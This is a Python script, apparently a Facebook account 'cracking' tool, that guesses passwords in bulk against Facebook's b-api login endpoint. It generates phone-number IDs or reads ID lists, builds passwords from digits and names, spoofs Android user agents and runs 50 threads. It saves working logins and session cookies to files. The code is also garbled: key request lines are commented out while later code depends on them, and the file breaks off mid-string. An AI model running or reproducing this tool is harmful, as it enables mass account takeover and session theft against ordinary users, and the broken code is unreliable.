#!/usr/bin/python3
#creater: Faraz Ali ID 
#_________[ IMPORTING MODULES ]______>>
import os,requests,json,time
import re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#__________[ EMPITY LOOP / LIST ]_______>>
oks = []
user_ID = []
cps = []
cracked = []
pwx = []
ualist = []
#_______[ BASIC COLORS ]_____>>
white = '\033[1;37m'
rad = '\033[1;31m'
green = '\x1b[38;5;46m'
#_________[ LOGO ]______>>>
def logo():
    os.system("clear")
    print(f"""_____   ____  ____    ____  _____ 
|     | /    T|    \  /    T|     T
|   __jY  o  ||  D  )Y  o  |l__/  |
|  l_  |     ||    / |     ||   __j
|   _] |  _  ||    \ |  _  ||  /  |
|  T   |  |  ||  .  Y|  |  ||     |
l__j   l__j__jl__j\_jl__j__jl_____j 
-------------------------------------------------
  Creater    :    Faraz Ali ID
  Facebook   :    Faraz Ali ID
  Github     :    FARAZ-ID
  Version    :    0.19.1
--------------------------------------------------""")
    print(50*'-')
#_________[ USER-AGENT LIST GENERATER ]______>>>
for i in range(100):
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code = str(random.randint(000000000,999999999))
    android_version = str(random.randrange(5,15))
    dens = str(random.randrange(0,5)) 
    xzx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HU', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HY', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313M', 'Galaxy Ace 4', 'vivaltods5m',])
    try:
        ualist.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
    except IndexError:
        pass
#______[MAIN MENU]__________>>
def FARAZ():
    logo()
    print(f'{white}[{green}1{white}] Random Crack')
    print(f'{white}[{green}2{white}] File Crack')
    print(f'{white}[{green}3{white}] File Crack Tools')
    print(f'{white}[{green}0{white}] Close Project')
    print(50*"-")
    tawasulxfaraz = input(f'{white}[{rad}?{white}] Select Code : {green}')
    if tawasulxfaraz in ['1','01']:
        random_number()
    elif tawasulxfaraz in ['2','02']:
        file_crack()
    elif tawasulxfaraz in ['3','03']:
        file_tool()
    elif tawasulxfaraz in ['0','00']:
        exit()
    else:
        print(f'{white}[{green}℅{white}] select at least one option ')
        FARAZ()
#______[ RANDOM NUMBER CRACK ]______>>
def random_number():
    logo()
    code = input(f"[{green}+{white}] Put Number : ")
    try:
        limit = int(input(f"[{green}+{white}] Put Limit  : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    try:
        limit = int(input(f"[{green}+{white}] Put Password Limit : "))
        if limit > 9:
            limit = 3
    except ValueError:
        limit = 3
    logo()
    print(f"[{green}+{white}] example : first6digit - fullnumber")
    print(f"[{green}+{white}] example : last6digit - last7digit")
    print(f"[{green}+{white}] example : khankhan - 786786 - 000786")
    print(50*'-')
    for i in range(limit):
        password = input(f"[{green}+{white}] Put Password {str(i+1)} : ")
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=50) as FarazAliID:
        total = str(len(user_ID))
        logo()
        print(f"[{green}+{white}] Your limit For Crack : {total}")
        print(f"[{green}+{white}] Total Password for Crack : {str(len(pwx))}")
        print(f"[{green}+{white}] Code for UID : {str(code)}")
        print(50*'-')
        for user in user_ID:
            uid = code+user
            FarazAliID.submit(bapi,uid,pwx,total)
    print('')
    print(50*"-")
    print(f"{white}[{green}-{white}] process Has been Completed")
    print(f"{white}[{green}-{white}] Total Ids : {len(oks)} ")
#___________[ FILE CLONING OLD / NEW ]__________>>
def file_crack():
    logo()
    fileX = input(f"[{green}+{white}] Input File Path : ")
    try:
        file_data = open(fileX,"r").read()
    except FileNotFoundError:
        exit(f"\n{rad} file not found ... ")
    except PermissionError:
        exit(f"\n{rad} allow the permission ... ")
    try:
        limit = int(input(f"\n[{green}+{white}] Input Password Limit : "))
        if limit > 9:
            limit = 3
    except ValueError:
        limit = 3
    logo()
    print(f"[{green}+{white}] example : first last - firstlast")
    print(f"[{green}+{white}] example : first123 - last1234")
    print(f"[{green}+{white}] example : firstlast123 - 786786 - khankhan")
    print(50*'-')
    for i in range(limit):
        password = input(f"[{green}+{white}] Input Password {str(i+1)} : ")
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=50) as FarazAliID:
        total = str(len(file_data.splitlines()))
        logo()
        print(f"[{green}*{white}] Total Ids For Crack : {total}")
      #  print(f"[{green}*{white}] Total Password for Crack : {str(len(pwx))}")
        print(f"[{green}*{white}] File Path : {fileX}")
        print(50*'-')
        uidX = file_data.splitlines()
        for uid in uidX:
            FarazAliID.submit(bapif,uid,pwx,total)
    print('')
    print(50*"-")
    print(f"{white}[{green}+{white}] process Has been Completed")
    print(f"{white}[{green}+{white}] Total Ids : {len(oks)} ")
#___________[ B-API CRACK ]________>>
def bapi(uid,pwx,total):
    global oks,cps
    global ualist
    global cracked
    try:
        last7digit = uid[int(len(uid))-7:]
        last6digit = uid[int(len(uid))-6:]
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}FARAZ{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            pw = pw.replace("last7digit",last7digit)
            pw = pw.replace("last6digit",last6digit)
            pw = pw.replace("first6digit",first6digit)
            pw = pw.replace("fullnumber",fullnumber)
            dataX = {'email':uid,
                    'password':pw,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
#'headersX = 'accept-encoding': 'gzip, deflate',
                #w    'Accept': '*/*', 
            #        'Connection': 'keep-alive', 
            #        'content-type': 'application/x-www-form-urlencoded', 
         #           'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
           #         'x-fb-friendly-name': 'authenticate', 
              #      'x-fb-http-engine': 'Liger',
                #    'user-agent': "Dalvik/2.1.0 (Linux; U; Android 11; W-V750BN-EEA Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M2101K7AG Build/RKQ1.201022.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; ok 2K TV Build/RTM4.220307.154)","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TY Build/SKQ1.211103.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; SKWHP40A-ZWL Build/QTT8.201201.004)","Dalvik/2.1.0 (Linux; U; Android 11; 8LB1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; AQUOS-TVX18 Build/OTT1.180130.001)","Dalvik/1.4.0 (Linux; U; Android 2.3.3; GT-I9000B Build/GINGERBREAD)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia C02 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G1600 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 10; KM1069 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BE72 Build/61.2.F.0.211)","Dalvik/2.1.0 (Linux; U; Android 10; Stream Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; 2107113SR Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 12; S100Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; CASPER_VIA_G1_Plus Build/OPM1.171019.019)","Dalvik/2.1.0 (Linux; U; Android 13; V2247 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TNS33.14-63-4-2)","Dalvik/2.1.0 (Linux; U; Android 11; trogdor Build/R114-15437.61.0)","Dalvik/2.1.0 (Linux; U; Android 11; W-K610-SUI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-N986B Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; TIQ-1049 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; ZEEKER P10 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Z2 Build/O11019) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; NTN-LX1 Build/HONORNTN-L21CQ)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor 18 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.A.0.418)","Dalvik/2.1.0 (Linux; U; Android 9; JVC SA 4K Android TV Build/PTO6.220702.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto g53y 5G Build/T1TPJ33.75-17-3)","Dalvik/1.6.0 (Linux; U; Android 4.2.1; PHS-601 Build/JOP40D)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi S2 Build/TQ3A.230605.012)","Dalvik/2.1.0 (Linux; U; Android 12; Air1 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SH-53C Build/S4273)","Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTT7.221026.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230605.010.A1)","Dalvik/2.1.0 (Linux; U; Android 9; 4K AI Smart TV Build/PTO5.210906.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T4 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 13; 22031116AI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android TV)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-31)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R116-15509.6.0)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2STS32.71-105-3)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3624 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; T50_EEA Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10.0; 9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 10; SNE-LX1 Build/HUAWEISNE-L21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; MI CC9 Pro Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 10; CLT-L29 Build/HUAWEICLT-L29) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A326U Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCOS29.114-134-20) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-DQ54 Build/67.0.A.4.22)","Dalvik/2.1.0 (Linux; U; Android 10; LEM12Pro Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; U696CL Build/UMX_U696CL_V11.01.02.01)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GHIA_A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; Elite P55Max Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; trogdor Build/R115-15474.41.0)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD8 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; 2207117BPG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; SKY PAD8 Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 Build/T2TLS33.3-22-5-2)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA VH1 Build/QTG3.200305.006.S313)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g22 Build/STAS32.79-77-28-50-5)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9)","Dalvik/2.1.0 (Linux; U; Android 10.1; R69 Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLAS33.105-129-2)","Dalvik/2.1.0 (Linux; U; Android 13; SM-F711B Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; J101-EEA Build/RP1A.201105.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; SM-N976N Build/PQ3B.190801.06281541)","Dalvik/2.1.0 (Linux; U; Android 10; V88 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; tv175a Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 10; W-K560-TVM Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STBS32.36-101-3)","Dalvik/2.1.0 (Linux; U; Android 13; C33 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; 22011119UY Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTO2.230307.001)","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R114-15437.57.0)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Max90 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; 21091116AI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 pro Build/T1SHS33.35-23-20-6)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; moto e20 Build/RONS31.267-94-3) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1B Build/HUAWEIMAR-L21B) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-N910C Build/MMB29K) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M8_4G Build/V5_20220714) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; KYV43 Build/1.010FO.39.a)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T825N0 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; POCO F1 Build/TQ3A.230605.012)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; X9 Build/KTU84P)","Dalvik/2.1.0 (Linux; U; Android 13; ANY-LX1 Build/HONORANY-L21CQ)",
        #    responce = requests.post('https://b-api.facebook.com/method/auth.login',data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                uidX = str(responce_json['uid'])
                if uidX not in oks:
                    print(f'\r{green}[OK] {uidX} | {pw} {white}')
                   # ckkk = ";".join(i["name"]+"="+i["value"] for i in responce_json["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    coki = ";".join(i["name"]+"="+i["value"] for i in responce_json["session_cookies"])
                    print(f"\r\r{green} Cookie: "+coki)
                    #print(f"{white}[{green}√{white} Cookie : {green}{cookie}")
                    open('/sdcard/FARAZ-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[CP] {uid}     | {pw} {white}')
                    open('/sdcard/FARAZ-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:pass
#_______[ B-API CRACK - FILE ]_____>>
def bapif(uidY,pwx,total):
    global oks,cps
    global ualist
    global cracked
    uid = uidY.split("|")[0]
    name = uidY.split("|")[1]
    fist = name.split(" ")[0]
    try:
        last = name.split(" ")[1]
    except IndexError:
        last = "Khan"
    try:
        sys.stdout.write(f'\r\r[{green}FARAZ {white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            pw = pw.replace("first",(fist.lower()))
            pw = pw.replace("last",(last.lower()))
            pw = pw.replace("fullname",(name.lower()))
            pw = pw.replace("First",fist)
            pw = pw.replace("Last",last)
            pw = pw.replace("Fullname",name)
            useragent = random.choice(ualist)
            adid = uuid.uuid4()
            device_id = uuid.uuid4()
            family_device_id = uuid.uuid4()
            sim = str(random.randint(11111, 99999))
            xfb_device = str(random.randint(1111, 9999))
            dataX = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': family_device_id,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US"',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
         #   headersX = {
                'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 11; W-V750BN-EEA Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M2101K7AG Build/RKQ1.201022.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; ok 2K TV Build/RTM4.220307.154)","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TY Build/SKQ1.211103.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; SKWHP40A-ZWL Build/QTT8.201201.004)","Dalvik/2.1.0 (Linux; U; Android 11; 8LB1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; AQUOS-TVX18 Build/OTT1.180130.001)","Dalvik/1.4.0 (Linux; U; Android 2.3.3; GT-I9000B Build/GINGERBREAD)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia C02 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G1600 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 10; KM1069 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BE72 Build/61.2.F.0.211)","Dalvik/2.1.0 (Linux; U; Android 10; Stream Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; 2107113SR Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 12; S100Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; CASPER_VIA_G1_Plus Build/OPM1.171019.019)","Dalvik/2.1.0 (Linux; U; Android 13; V2247 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TNS33.14-63-4-2)","Dalvik/2.1.0 (Linux; U; Android 11; trogdor Build/R114-15437.61.0)","Dalvik/2.1.0 (Linux; U; Android 11; W-K610-SUI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-N986B Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; TIQ-1049 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; ZEEKER P10 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Z2 Build/O11019) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; NTN-LX1 Build/HONORNTN-L21CQ)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor 18 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.A.0.418)","Dalvik/2.1.0 (Linux; U; Android 9; JVC SA 4K Android TV Build/PTO6.220702.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto g53y 5G Build/T1TPJ33.75-17-3)","Dalvik/1.6.0 (Linux; U; Android 4.2.1; PHS-601 Build/JOP40D)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi S2 Build/TQ3A.230605.012)","Dalvik/2.1.0 (Linux; U; Android 12; Air1 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SH-53C Build/S4273)","Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTT7.221026.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230605.010.A1)","Dalvik/2.1.0 (Linux; U; Android 9; 4K AI Smart TV Build/PTO5.210906.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T4 